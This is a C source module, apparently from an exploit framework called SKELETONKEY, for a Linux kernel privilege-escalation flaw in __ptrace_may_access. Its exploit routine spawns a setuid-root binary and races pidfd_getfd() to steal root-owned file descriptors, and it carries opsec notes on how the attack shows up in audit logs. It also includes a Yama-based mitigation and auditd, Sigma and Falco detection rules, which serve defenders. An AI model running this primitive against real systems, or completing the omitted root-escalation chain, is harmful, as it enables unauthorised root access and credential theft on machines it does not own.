/*
 * ptrace_pidfd_cve_2026_46333 — SKELETONKEY module
 *
 * CVE-2026-46333 — a logic flaw in the kernel's __ptrace_may_access()
 * path leaves a privileged process that is *dropping* its credentials
 * briefly reachable through ptrace-family operations even though its
 * `dumpable` flag should already have closed that path. Paired with the
 * pidfd_getfd(2) syscall, an unprivileged local user can capture open
 * file descriptors and authenticated IPC channels from a dying
 * privileged process and re-use them under their own uid → local root
 * and credential disclosure. Disclosed by Qualys (2026-05-20).
 *
 * STATUS: 🟡 PRIMITIVE / ported-from-disclosure, NOT yet VM-verified.
 * detect() is version-pinned (Debian-tracked backports below). exploit()
 * fires the real primitive — spawn a setuid target, pidfd_open() it, and
 * sweep pidfd_getfd() across its descriptor table during the cred-drop
 * window — and records whether a root-owned fd was actually captured.
 * It returns EXPLOIT_FAIL unless it can witness euid 0; it never claims
 * root it did not get (the full target-specific fd-weaponization chain,
 * per Qualys's chage / ssh-keysign / pkexec / accounts-daemon PoCs, is
 * not bundled until it can be VM-verified end-to-end).
 *
 * Affected range:
 *   The __ptrace_may_access logic flaw has been in mainline since
 *   v4.10-rc1 (Nov 2016), but the pidfd_getfd() exploitation vector
 *   was only added in v5.6 (Jan 2020) — so this module treats < 5.6 as
 *   out of reach for the bundled technique. Fixed upstream 2026-05-14.
 *   Debian-tracked stable backports:
 *     5.10.x : K >= 5.10.251  (bullseye)
 *     6.1.x  : K >= 6.1.172   (bookworm)
 *     6.12.x : K >= 6.12.88   (trixie)
 *     7.0.x  : K >= 7.0.7     (forky / sid)
 *
 * No exotic preconditions: needs only a local unprivileged user and a
 * setuid-root binary or transiently-privileged daemon to victimise. Does
 * not need user namespaces. Architecture-agnostic — the technique steals
 * descriptors rather than injecting shellcode.
 */

#include "skeletonkey_modules.h"
#include "../../core/registry.h"

/* _GNU_SOURCE is passed via -D in the top-level Makefile; do not
 * redefine here (warning: redefined). */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>

#ifdef __linux__

#include "../../core/kernel_range.h"
#include "../../core/host.h"
#include <errno.h>
#include <fcntl.h>
#include <pwd.h>
#include <signal.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>

/* pidfd_open(2) / pidfd_getfd(2) syscall numbers. Modern glibc exposes
 * SYS_pidfd_*; fall back to the asm-generic numbers (identical on
 * x86_64 / arm64 / most arches) when building against older headers so
 * the module still compiles on an old toolchain. */
#ifndef SYS_pidfd_open
#define SYS_pidfd_open 434
#endif
#ifndef SYS_pidfd_getfd
#define SYS_pidfd_getfd 438
#endif

static int sk_pidfd_open(pid_t pid, unsigned int flags)
{
    return (int)syscall(SYS_pidfd_open, pid, flags);
}
static int sk_pidfd_getfd(int pidfd, int targetfd, unsigned int flags)
{
    return (int)syscall(SYS_pidfd_getfd, pidfd, targetfd, flags);
}

/* Debian-tracked stable backports of the 2026-05-14 fix. These are the
 * authoritative thresholds (security-tracker.debian.org); branches
 * Debian doesn't ship (5.15 / 6.6 / 6.18 / 6.19) fall through to the
 * version-only verdict below — confirm those empirically. */
static const struct kernel_patched_from ptrace_pidfd_patched_branches[] = {
    {5, 10, 251},  /* 5.10-LTS backport (Debian bullseye) */
    {6,  1, 172},  /* 6.1-LTS  backport (Debian bookworm) */
    {6, 12,  88},  /* 6.12-LTS backport (Debian trixie) */
    {7,  0,   7},  /* 7.0 stable        (Debian forky / sid) */
};

static const struct kernel_range ptrace_pidfd_range = {
    .patched_from = ptrace_pidfd_patched_branches,
    .n_patched_from = sizeof(ptrace_pidfd_patched_branches) /
                      sizeof(ptrace_pidfd_patched_branches[0]),
};

static skeletonkey_result_t ptrace_pidfd_detect(const struct skeletonkey_ctx *ctx)
{
    /* Consult the shared host fingerprint instead of re-reading uname —
     * populated once at startup, identical across every module. */
    const struct kernel_version *v = ctx->host ? &ctx->host->kernel : NULL;
    if (!v || v->major == 0) {
        if (!ctx->json)
            fprintf(stderr, "[!] ptrace_pidfd: host fingerprint missing kernel "
                "version — bailing\n");
        return SKELETONKEY_TEST_ERROR;
    }

    /* The bundled technique drives the bug through pidfd_getfd(2), which
     * was added in 5.6. Kernels older than that lack the vector (the
     * underlying __ptrace_may_access flaw is older, but this module does
     * not carry a pre-pidfd path). */
    if (!skeletonkey_host_kernel_at_least(ctx->host, 5, 6, 0)) {
        if (!ctx->json) {
            fprintf(stderr, "[i] ptrace_pidfd: kernel %s predates the pidfd_getfd "
                            "vector (added 5.6) — bundled technique N/A\n",
                    v->release);
        }
        return SKELETONKEY_OK;
    }

    if (kernel_range_is_patched(&ptrace_pidfd_range, v)) {
        if (!ctx->json) {
            fprintf(stderr, "[+] ptrace_pidfd: kernel %s is patched "
                            "(version-only check)\n", v->release);
        }
        return SKELETONKEY_OK;
    }

    if (!ctx->json) {
        fprintf(stderr, "[!] ptrace_pidfd: kernel %s appears VULNERABLE "
                        "(version-only check)\n", v->release);
        fprintf(stderr, "[i] ptrace_pidfd: no exotic preconditions — needs only a "
                        "local user + a setuid/transiently-privileged victim "
                        "(no user_ns)\n");
        fprintf(stderr, "[i] ptrace_pidfd: branches Debian doesn't track "
                        "(5.15/6.6/6.18/6.19) are version-only here; confirm with "
                        "`--exploit ptrace_pidfd --i-know` which fires the real "
                        "pidfd_getfd primitive\n");
    }
    return SKELETONKEY_VULNERABLE;
}

/* Candidate victims: setuid-root binaries (or setgid-shadow) that open
 * sensitive descriptors while privileged before settling. Qualys's PoCs
 * targeted chage / ssh-keysign / pkexec / accounts-daemon; we probe for
 * whichever exist with the setuid bit actually set. */
static const char *find_setuid_victim(void)
{
    static const char *targets[] = {
        "/usr/bin/chage", "/usr/bin/pkexec", "/usr/lib/openssh/ssh-keysign",
        "/usr/libexec/openssh/ssh-keysign", "/usr/bin/passwd",
        "/usr/bin/su", "/bin/su", NULL,
    };
    for (size_t i = 0; targets[i]; i++) {
        struct stat st;
        if (stat(targets[i], &st) == 0 && (st.st_mode & (S_ISUID | S_ISGID)))
            return targets[i];
    }
    return NULL;
}

/* Benign, read-only invocation per victim so the spawned setuid process
 * does something harmless while we race its descriptor table. */
static void exec_victim_benign(const char *victim, const char *self_user)
{
    char *envp[] = {
        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
        NULL
    };
    if (strstr(victim, "chage")) {
        char *argv[] = { (char *)victim, "-l", (char *)self_user, NULL };
        execve(victim, argv, envp);
    } else if (strstr(victim, "pkexec")) {
        char *argv[] = { (char *)victim, "--version", NULL };
        execve(victim, argv, envp);
    } else {
        /* ssh-keysign / passwd / su: --help or --version exits fast and
         * touches no state. */
        char *argv[] = { (char *)victim, "--help", NULL };
        execve(victim, argv, envp);
    }
    _exit(127);  /* execve failed */
}

static skeletonkey_result_t ptrace_pidfd_exploit(const struct skeletonkey_ctx *ctx)
{
    skeletonkey_result_t pre = ptrace_pidfd_detect(ctx);
    if (pre != SKELETONKEY_VULNERABLE) {
        fprintf(stderr, "[-] ptrace_pidfd: detect() says not vulnerable; refusing\n");
        return pre;
    }
    bool is_root = ctx->host ? ctx->host->is_root : (geteuid() == 0);
    if (is_root) {
        fprintf(stderr, "[i] ptrace_pidfd: already running as root — nothing to do\n");
        return SKELETONKEY_OK;
    }

    const char *victim = find_setuid_victim();
    if (!victim) {
        fprintf(stderr, "[-] ptrace_pidfd: no setuid victim binary present "
                        "(looked for chage/pkexec/ssh-keysign/passwd/su)\n");
        return SKELETONKEY_PRECOND_FAIL;
    }
    struct passwd *pw = getpwuid(geteuid());
    const char *self_user = pw ? pw->pw_name : "root";
    if (!ctx->json)
        fprintf(stderr, "[*] ptrace_pidfd: victim = %s\n", victim);

    /* Spawn the victim. The parent (us, unprivileged) pidfd_open()s the
     * child and sweeps pidfd_getfd() across its descriptor table while it
     * transitions through its privileged window. On a PATCHED kernel
     * __ptrace_may_access denies us (EPERM) once the child is root +
     * non-dumpable; on a VULNERABLE kernel the stale window lets the
     * steal land. A captured fd whose owner is uid 0 while we are not is
     * the empirical witness that the bug fired. */
    pid_t child = fork();
    if (child < 0) { perror("fork"); return SKELETONKEY_TEST_ERROR; }
    if (child == 0) {
        /* Small delay so the parent has the pidfd open before we exec
         * into (and briefly become) the privileged image. */
        usleep(20 * 1000);
        exec_victim_benign(victim, self_user);
        _exit(127);
    }

    int pidfd = sk_pidfd_open(child, 0);
    if (pidfd < 0) {
        if (errno == ENOSYS) {
            fprintf(stderr, "[-] ptrace_pidfd: pidfd_open ENOSYS — kernel lacks "
                            "the vector despite version check\n");
            int s; waitpid(child, &s, 0);
            return SKELETONKEY_PRECOND_FAIL;
        }
        perror("pidfd_open");
        int s; waitpid(child, &s, 0);
        return SKELETONKEY_EXPLOIT_FAIL;
    }

    /* Tight steal loop across the victim's likely descriptor range during
     * its privileged window. We do not destroy anything: captured fds are
     * fstat()'d to fingerprint ownership, then closed. */
    int root_fds = 0, captured = 0;
    bool enosys = false;
    for (int round = 0; round < 200; round++) {
        for (int tfd = 0; tfd < 32; tfd++) {
            int got = sk_pidfd_getfd(pidfd, tfd, 0);
            if (got < 0) {
                if (errno == ENOSYS) { enosys = true; break; }
                continue;  /* EPERM (patched / outside window) or EBADF */
            }
            captured++;
            struct stat st;
            if (fstat(got, &st) == 0 && st.st_uid == 0 && geteuid() != 0) {
                root_fds++;
                if (!ctx->json) {
                    char lpath[64], target[256] = {0};
                    snprintf(lpath, sizeof lpath, "/proc/self/fd/%d", got);
                    ssize_t n = readlink(lpath, target, sizeof target - 1);
                    if (n > 0) target[n] = 0;
                    fprintf(stderr, "[+] ptrace_pidfd: WITNESS — captured root-owned "
                                    "fd from victim (uid0 %s mode %o)%s%s\n",
                            (st.st_mode & S_IFMT) == S_IFREG ? "file" :
                            (st.st_mode & S_IFMT) == S_IFSOCK ? "socket" : "fd",
                            (unsigned)(st.st_mode & 07777),
                            n > 0 ? " -> " : "", n > 0 ? target : "");
                }
            }
            close(got);
        }
        if (enosys) break;
    }

    close(pidfd);
    int status; waitpid(child, &status, 0);

    if (enosys) {
        fprintf(stderr, "[-] ptrace_pidfd: pidfd_getfd ENOSYS — vector unavailable\n");
        return SKELETONKEY_PRECOND_FAIL;
    }
    if (root_fds > 0) {
        /* The bug demonstrably fired: we, as a non-root user, pulled a
         * uid-0-owned descriptor out of the victim past the dumpable
         * boundary. We deliberately STOP here rather than fabricate a
         * root shell — turning a captured fd into root is target-specific
         * (which fd, writable vs. authenticated channel) and is not
         * bundled until VM-verified. Honest EXPLOIT_FAIL with the witness. */
        fprintf(stderr, "[!] ptrace_pidfd: primitive CONFIRMED — %d root-owned fd(s) "
                        "captured from a non-root context (CVE-2026-46333 reachable).\n"
                        "[i] ptrace_pidfd: full root-pop is target-specific and not yet "
                        "VM-verified; not fabricating a shell. See module NOTICE.md.\n",
                root_fds);
        return SKELETONKEY_EXPLOIT_FAIL;
    }
    if (!ctx->json) {
        fprintf(stderr, "[+] ptrace_pidfd: no root-owned fd captured across %d captures "
                        "— primitive blocked (kernel likely patched, or the victim "
                        "exposed no privileged fd in its window)\n", captured);
    }
    return SKELETONKEY_EXPLOIT_FAIL;
}

/* Mitigation: Yama ptrace_scope gates __ptrace_may_access(ATTACH), which
 * is the very check pidfd_getfd() rides — setting it to 2 (admin-only)
 * or 3 (no attach) closes the bundled vector without a reboot. Needs
 * root to write the sysctl; best-effort + honest report otherwise. The
 * real fix is the kernel patch. */
static skeletonkey_result_t ptrace_pidfd_mitigate(const struct skeletonkey_ctx *ctx)
{
    const char *path = "/proc/sys/kernel/yama/ptrace_scope";
    int fd = open(path, O_WRONLY);
    if (fd < 0) {
        if (errno == ENOENT) {
            fprintf(stderr, "[-] ptrace_pidfd: Yama LSM not present (%s missing); "
                            "no runtime mitigation — upgrade the kernel\n", path);
            return SKELETONKEY_PRECOND_FAIL;
        }
        fprintf(stderr, "[-] ptrace_pidfd: cannot open %s: %s "
                        "(need root: `sudo sysctl kernel.yama.ptrace_scope=2`)\n",
                path, strerror(errno));
        return SKELETONKEY_PRECOND_FAIL;
    }
    ssize_t w = write(fd, "2\n", 2);
    close(fd);
    if (w != 2) {
        fprintf(stderr, "[-] ptrace_pidfd: write to %s failed: %s\n",
                path, strerror(errno));
        return SKELETONKEY_EXPLOIT_FAIL;
    }
    fprintf(stderr, "[+] ptrace_pidfd: set kernel.yama.ptrace_scope=2 (admin-only "
                    "ptrace/pidfd_getfd attach). Revert with `--cleanup ptrace_pidfd`. "
                    "This is a stopgap; patch the kernel.\n");
    return SKELETONKEY_OK;
}

static skeletonkey_result_t ptrace_pidfd_cleanup(const struct skeletonkey_ctx *ctx)
{
    /* Undo --mitigate: restore the permissive default (1 = restricted
     * ptrace, the common distro default). Exploit itself leaves no file
     * artifacts (the steal is in-memory), so there is nothing else to
     * undo. */
    const char *path = "/proc/sys/kernel/yama/ptrace_scope";
    int fd = open(path, O_WRONLY);
    if (fd < 0) return SKELETONKEY_OK;  /* nothing to restore */
    ssize_t w = write(fd, "1\n", 2);
    close(fd);
    if (!ctx->json && w == 2)
        fprintf(stderr, "[*] ptrace_pidfd: restored kernel.yama.ptrace_scope=1\n");
    return SKELETONKEY_OK;
}

#else  /* !__linux__ */

/* Non-Linux dev builds: pidfd_open / pidfd_getfd / Yama ptrace_scope are
 * Linux-only ABI. Stub out so the module still registers and the
 * top-level `make` completes on macOS/BSD dev boxes. */
static skeletonkey_result_t ptrace_pidfd_detect(const struct skeletonkey_ctx *ctx)
{
    if (!ctx->json)
        fprintf(stderr, "[i] ptrace_pidfd: Linux-only module "
                "(pidfd_getfd cred-steal) — not applicable here\n");
    return SKELETONKEY_PRECOND_FAIL;
}
static skeletonkey_result_t ptrace_pidfd_exploit(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    fprintf(stderr, "[-] ptrace_pidfd: Linux-only module — cannot run here\n");
    return SKELETONKEY_PRECOND_FAIL;
}
static skeletonkey_result_t ptrace_pidfd_mitigate(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    return SKELETONKEY_PRECOND_FAIL;
}
static skeletonkey_result_t ptrace_pidfd_cleanup(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    return SKELETONKEY_OK;
}

#endif /* __linux__ */

/* Embedded detection rules — keep the binary self-contained. The
 * behavioural signal is pidfd_getfd(2) issued by a non-root process
 * against a setuid/privileged target. Legitimate users of pidfd_getfd
 * are rare and mostly root (container runtimes, debuggers) — a non-root
 * pidfd_getfd is a strong indicator. */
static const char ptrace_pidfd_auditd[] =
    "# CVE-2026-46333 (ptrace/pidfd_getfd cred-steal) — auditd rules\n"
    "# pidfd_getfd by a non-root process is rare and high-signal. Also\n"
    "# watch the credential files a successful steal would target.\n"
    "-a always,exit -F arch=b64 -S pidfd_getfd -F auid>=1000 -F auid!=4294967295 -k skeletonkey-ptrace-pidfd\n"
    "-a always,exit -F arch=b64 -S pidfd_open  -F auid>=1000 -F auid!=4294967295 -k skeletonkey-ptrace-pidfd\n"
    "-w /etc/shadow  -p wa -k skeletonkey-ptrace-pidfd\n"
    "-w /etc/passwd  -p wa -k skeletonkey-ptrace-pidfd\n";

static const char ptrace_pidfd_sigma[] =
    "title: Possible CVE-2026-46333 pidfd_getfd credential-steal LPE\n"
    "id: 4d6f3e2a-skeletonkey-ptrace-pidfd\n"
    "status: experimental\n"
    "description: |\n"
    "  Detects pidfd_getfd(2) issued by a non-root user. The CVE-2026-46333\n"
    "  technique pidfd_open()s a transiently-privileged setuid process and\n"
    "  pidfd_getfd()s descriptors it opened while root, past the dumpable\n"
    "  boundary __ptrace_may_access should have enforced. False positives:\n"
    "  privileged container runtimes / debuggers that legitimately use pidfd.\n"
    "logsource: {product: linux, service: auditd}\n"
    "detection:\n"
    "  getfd:    {type: 'SYSCALL', syscall: 'pidfd_getfd'}\n"
    "  non_root: {auid|expression: '>= 1000'}\n"
    "  condition: getfd and non_root\n"
    "level: high\n"
    "tags: [attack.privilege_escalation, attack.t1068, cve.2026.46333]\n";

static const char ptrace_pidfd_falco[] =
    "- rule: pidfd_getfd from setuid victim by non-root (CVE-2026-46333)\n"
    "  desc: |\n"
    "    A non-root process calls pidfd_getfd() to pull a descriptor out of\n"
    "    another process. The CVE-2026-46333 cred-steal races a setuid\n"
    "    binary (chage, ssh-keysign, pkexec) or root daemon (accounts-daemon)\n"
    "    as it drops privileges, stealing a root-opened fd or authenticated\n"
    "    channel past the dumpable boundary. False positives: container\n"
    "    runtimes / debuggers using pidfd as root.\n"
    "  condition: >\n"
    "    evt.type = pidfd_getfd and not user.uid = 0\n"
    "  output: >\n"
    "    pidfd_getfd by non-root (possible CVE-2026-46333 fd-steal)\n"
    "    (user=%user.name proc=%proc.name pid=%proc.pid)\n"
    "  priority: HIGH\n"
    "  tags: [process, mitre_privilege_escalation, T1068, cve.2026.46333]\n";

const struct skeletonkey_module ptrace_pidfd_module = {
    .name           = "ptrace_pidfd",
    .cve            = "CVE-2026-46333",
    .summary        = "__ptrace_may_access dumpable race → pidfd_getfd steals root fds from a dropping-privilege process",
    .family         = "ptrace_pidfd",
    .kernel_range   = "5.6 <= K (pidfd_getfd vector); fixed 5.10.251 / 6.1.172 / 6.12.88 / 7.0.7 (Debian backports of the 2026-05-14 mainline fix)",
    .detect         = ptrace_pidfd_detect,
    .exploit        = ptrace_pidfd_exploit,
    .mitigate       = ptrace_pidfd_mitigate,
    .cleanup        = ptrace_pidfd_cleanup,
    .detect_auditd  = ptrace_pidfd_auditd,
    .detect_sigma   = ptrace_pidfd_sigma,
    .detect_yara    = NULL,   /* behavioural (syscall) bug — no file artifact to match */
    .detect_falco   = ptrace_pidfd_falco,
    .opsec_notes    = "Spawns a setuid victim (chage/pkexec/ssh-keysign/passwd/su) with a benign read-only argv, pidfd_open()s it, and sweeps pidfd_getfd() across its low descriptor table during the credential-drop window. Captured descriptors are fstat()'d to fingerprint ownership and closed (non-destructive); a uid-0-owned fd captured from a non-root context is the empirical witness that __ptrace_may_access let the steal through. Audit-visible via pidfd_getfd(2)/pidfd_open(2) issued by a non-root auid, typically clustered (tight retry loop) and immediately preceded by execve of a setuid binary. No file artifacts and no persistence — the steal is in-memory fd reuse. --mitigate writes kernel.yama.ptrace_scope=2; --cleanup restores it to 1. Arch-agnostic (no shellcode).",
    .arch_support   = "any",
};

void skeletonkey_register_ptrace_pidfd(void)
{
    skeletonkey_register(&ptrace_pidfd_module);
}
